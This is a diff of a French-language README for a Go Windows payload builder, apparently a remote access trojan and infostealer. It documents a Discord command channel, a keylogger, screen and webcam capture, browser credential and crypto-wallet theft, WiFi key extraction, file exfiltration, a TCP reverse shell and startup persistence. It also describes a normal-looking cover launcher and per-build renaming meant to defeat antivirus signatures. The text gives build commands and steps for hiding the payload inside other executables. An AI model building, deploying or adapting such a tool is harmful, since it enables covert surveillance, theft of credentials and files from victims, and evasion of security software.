@@ -1,127 +1,85 @@
-# francais2nd-payload-builder
+# payload-builder
 
-Payload Windows en Go (module autonome) + **builder en ligne de commande** :
-C2 Discord par commandes `!`, keylogger en temps réel avec salon dédié,
-captures d'écran multi-écrans, photos de webcam sur salon dédié, extraction
-d'identifiants de navigateurs
-(DPAPI, Firefox inclus), reverse shell TCP (`cmd` ou PowerShell), persistance
-démarrage Windows.
+Payload Windows en Go (module autonome) + **builder en ligne de commande**.
 
-Le dépôt contient **du code source uniquement** : `payload.example.json` est
-vierge (aucun jeton, aucun identifiant Discord), `payload.json` est gitignoré
-— votre configuration réelle ne quitte jamais votre machine.
+Un binaire, aucune dépendance : C2 Discord par commandes `!`, journal clavier
+temps réel, captures d'écran multi-écrans, photos et vidéos de webcam,
+extraction des navigateurs (Chromium + Firefox), WiFi, géolocalisation,
+fichiers par type, persistance au démarrage, retrait complet.
 
-## Contenu
+Ce dépôt ne contient **que du code source**. `payload.example.json` est vierge
+(aucun jeton, aucun identifiant Discord) ; `payload.json` et `payload.enc` sont
+gitignorés — la configuration réelle ne quitte jamais la machine de l'opérateur.
+
+## Organisation
 
 | Fichier | Rôle |
 |---|---|
-| `main.go` | Hôte autonome (sans fenêtre) : instance unique, `-diag`, `startPayload()` |
-| `payload.go` | Configuration embarquée, cadences, transport Discord, journal local |
-| `channel.go` | Salon `<machine>` + `-keylogs` + `-screenshots` + `-webcam` + `-files-*` + **catégorie** Discord, créés à la demande par le bot |
-| `c2.go` | C2 Discord : `!help`, `!shell`, `!shell_ps`, `!shell_tcp`, `!steal`, `!keylog`, `!screenshot`, `!webcam`, `!sysinfo`, `!licence`, `!elevate`, `!clip`, `!ls`, `!cat`, `!download`, `!persist`, `!stop` |
-| `stealer.go` | DPAPI, bases navigateurs (Chromium + Firefox), jetons, portefeuilles, rapport machine |
-| `firefox.go` | Décryptage Firefox (clé PBKDF2, `logins.json`/`key4.db`) |
-| `keylogger.go` | Touches + fenêtre active + presse-papiers, horodatés, flux 5 s |
-| `screenshot.go` | Capture GDI → PNG, un fichier par moniteur |
-| `webcam.go` | Photo webcam PowerShell/WinRT (sans dépendance) → `<machine>-webcam` |
-| `persist.go` | Copie de repli EdgeUpdate + clé Run HKCU + VBS Démarrage (UTF-16LE) |
-| `winapi.go` | Registre, licences Windows, élévation UAC, IP publique |
-| `cmd/builder` | Builder CLI (voir ci-dessous) |
-| `c2out.go` | Exécution cmd/PowerShell : sortie complète, UTF-8 + repli OEM, pièce jointe au-delà de 1 800 caractères |
-| `media.go` | Captures d'écran : échelle ×1/×2/×3, envoi dans `<machine>-screenshots` |
-| `menu.go` | Bandeau d'état (en ligne/hors ligne) + menu par six réactions |
-| `fileexfil.go` | Veille temps réel des dossiers utilisateur → salons `-files-pdf/images/docs/archives/new` |
-| `fileops.go` | Recherche, zip, upload URL, exec, suppression, arrêt machine, webcam vidéo, captures programmées |
-| `wifi.go` | Profils WiFi et clés en clair (netsh, français et anglais) |
-| `location.go` | Position Windows + IP + adresse postale (Nominatim) |
-| `apps.go` | Liste des processus avec chemins, ouverture, fermeture, kill |
-| `prank.go` | Effets réversibles : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse |
-| `wipe.go` | Raccourci Démarrage, tâche planifiée, réparation, nettoyage des builds précédents, `!delete confirm` |
-| `hardware.go` | CPU, RAM, disques, GPU, écrans pour `!sysinfo` |
+| `main.go` | Hôte autonome : instance unique, `-diag`, `startPayload()` |
+| `payload.go` | Configuration chiffrée, cadences, transport Discord, journaux |
+| `channel.go` | Catégorie par machine + salons `-keylogs`, `-screenshots`, `-webcam`, `-files-*` |
+| `c2.go` | Commandes `!` et reverse shell |
+| `c2out.go` | Sortie cmd/PowerShell complète, UTF-8 + repli OEM, pièce jointe si longue |
+| `menu.go` | Bandeau d'état (en ligne / hors ligne) + menu par réactions |
+| `keylogger.go` | Crochet clavier bas niveau + presse-papiers, flux 5 s |
+| `screenshot.go` / `media.go` | Capture GDI par moniteur, agrandissement ×1-×3, envoi |
+| `webcam.go` / `mjpeg_avi.go` | Photo WinRT sans dépendance ; vidéo AVI MJPEG écrite à la main |
+| `stealer.go` / `firefox.go` | DPAPI, bases Chromium et Firefox, jetons, portefeuilles, rapport machine |
+| `fileexfil.go` / `bulk.go` | Veille temps réel des dossiers + extraction initiale massive |
+| `fileops.go` | Recherche, zip, upload URL, exec, suppression, arrêt machine, captures programmées |
+| `wifi.go` | Profils WiFi et clés en clair (netsh FR/EN) |
+| `location.go` | Position Windows, bornes Wi-Fi (BeaconDB), adresse (Nominatim) |
+| `apps.go` | Processus avec chemins, ouverture, fermeture, kill |
+| `prank.go` | Effets réversibles (message, fond d'écran, rotation, volume…) |
+| `persist.go` / `wipe.go` | Ancrages de démarrage, réparation, nettoyage des builds, `!delete` |
+| `hardware.go` | CPU, RAM, disques, GPU, écrans |
+| `defender.go` | État de Defender et exclusions (admin requis) |
+| `cmd/builder` | Builder CLI |
+| `cmd/seal` | Chiffre `payload.json` → `payload.enc` (AES-256-GCM) |
+| `cmd/cover` | Lanceur d'apparence normale qui embarque le payload |
 
 ## Compiler
-
-Avec le builder (recommandé) :
 
 ```bat
 go run ./cmd/builder -bot-token "VOTRE_JETON" -guild ID_SERVEUR -channel ID_SALON -out app.exe
 ```
 
-Le builder lit `payload.example.json`, écrit `payload.json` (config réelle,
-gitignorée) puis lance `go build -ldflags "-H windowsgui -s -w" -o app.exe .`
-
-| Drapeau | Défaut | Rôle |
-|---|---|---|
-| `-bot-token`, `-guild`, `-channel` | **obligatoires** | jeton du bot, serveur, salon de repli |
-| `-webhook` | vide | transport webhook Discord à la place du bot |
-| `-out` | `payload.exe` | chemin de sortie |
-| `-persist` | `true` | persistance démarrage Windows |
-| `-shell`, `-shell-host`, `-shell-port` | `false`, vide, `4444` | reverse shell TCP sortant |
-| `-steal` / `-keylog` / `-screenshot` / `-webcam` / `-exfil` | modèle | cadences en minutes (`-1` = modèle) |
-| `-ldflags` | `-H windowsgui -s -w` | sans console, binaire élagué |
-| `-src` | auto | dossier source si builder lancé ailleurs |
-
-À la main, sans builder :
+Le builder écrit `payload.json`, le chiffre dans `payload.enc` puis lance :
 
 ```bat
-copy payload.example.json payload.json
-go build -ldflags "-H windowsgui -s -w" -o app.exe .
+go build -ldflags "-H windowsgui -s -w -buildid=" -o app.exe .
 ```
 
-Vérification : `app.exe -diag` écrit `diagnostic.txt` (l'exécutable n'a pas de
-console, l'info va dans le fichier).
+`build.ps1` fait la même chose avec des empreintes renouvelées à chaque build
+(valeur Run, nom du miroir, dossier de travail, mutex) : ce que l'antivirus a
+mémorisé ne correspond plus à rien au build suivant.
 
-## Intégrer le payload dans une autre application
+## Utilisation
 
-Le payload est indépendant de l'interface : il ne dépend d'aucun fichier HTML,
-de WebView2 ni du reste de l'application d'origine. Pour le cacher dans un
-autre exécutable Go existant :
+1. Lancer l'exécutable : une catégorie au nom de la machine apparaît dans le
+   serveur Discord, avec ses salons.
+2. Le bandeau du salon principal affiche l'état, l'utilisateur, les IP et la
+   persistance. Six réactions y servent de boutons.
+3. Taper une commande dans le salon de la machine (`!help` pour la liste).
 
-1. **Copier** les fichiers `payload.go channel.go c2.go stealer.go firefox.go
-   keylogger.go screenshot.go webcam.go persist.go winapi.go` + `payload.json`
-   dans le
-   projet cible (même module ou module requis).
-2. **Fournir le seul symbole manquant** : `writeLog(string)`. Soit vous le
-   recopiez depuis `main.go` de ce dépôt (avec `diagMode` et `-diag`), soit
-   vous supprimez les lignes `if cfg.Debug { writeLog(...) }` dans
-   `payload.go` si vous ne voulez pas de debug.
-3. **Appeler `startPayload()`** une seule fois au démarrage, après votre
-   init. Rien d'autre à faire : `//go:embed payload.json` est déjà dans
-   `payload.go`, les goroutines s'auto-gèrent (garde panique, cadences,
-   instance unique à assurer par le hôte si besoin).
-4. **Options de hachage/furtivité** :
-   - `-ldflags "-H windowsgui -s -w"` : pas de console, symboles retirés ;
-   - icône/manifeste : `rsrc -manifest app.manifest -o rsrc.syso` puis
-     `go build` (le .syso est lié automatiquement) ;
-   - renommer l'exécutable et le versionner (`-ldflags "-s -w -H windowsgui
-     -X main.version=1.2"`) ;
-   - packer externe type UPX si le contour du binaire pose problème.
-5. **Renommer les empreintes** (évite collisions et signatures nommées) —
-   cherchez-les dans le code copié :
-   - mutex `Local\Francais2ndInstance` (`singleInstance`, `main.go`) ;
-   - valeur de registre `Francais2ndUpdate` et fichier
-     `msedgewebview2_update.exe` (`persist.go`) ;
-   - script `sysupdate.vbs` du Démarrage (`persist.go`) ;
-   - dossier `%LOCALAPPDATA%\Francais2nd` (`payload.go`) ;
-   - noms de salon/`hostChannelName` (`channel.go`) si vous voulez un autre
-     préfixe de salons.
-6. Recompiler. Le JSON embarqué ne change qu'à la compilation.
+Les résultats des commandes reviennent dans le salon de commande ; les
+captures automatiques, la webcam et les fichiers vont dans leurs salons dédiés.
 
-## État antivirus — constat honnête
+## Cadences par défaut
 
-Microsoft Defender détecte ce code (signature cloud, du 17/10/2026) : copie de
-repli mise en quarantaine, clé Run retirée, lancement bloqué ; un build
-recompilé repasse le filtre, mais la détection peut revenir à chaque mise à
-jour. Ce dépôt ne fournit ni exclusion, ni contournement d'antivirus — la
-persistance se réécrit toute seule via `persistRepair()`, et un rebuild est la
-seule réponse documentée. Usage à tester sur vos propres machines.
+| Tâche | Période |
+|---|---|
+| journal clavier | 5 s |
+| captures d'écran | 20 s |
+| webcam | 1 min |
+| logs locaux | 10 min |
+| extraction navigateurs | 24 h |
 
-## Usage des commandes
+## Configuration
 
-Une fois le payload lancé, tapez `!help` dans le salon Discord de la machine :
-la liste complète (16 commandes) s'affiche. Les journaux de clavier arrivent
-toutes les 5 s dans `<machine>-keylogs`, les photos de webcam toutes les
-10 min dans `<machine>-webcam`, le tout classé dans la catégorie `<machine>`.
-Fermer l'interface de l'application d'origine n'arrête pas le payload s'il
-est intégré avec le mode worker (voir la version intégrée) ; ici, l'hôte
-autonome vit jusqu'à `!stop`.
+`payload.example.json` documente chaque champ : jeton de bot, serveur, salon de
+repli, hôte de reverse shell, cadences, persistance, échelle des captures.
+
+## Licence
+
+Usage privé. Aucune garantie.
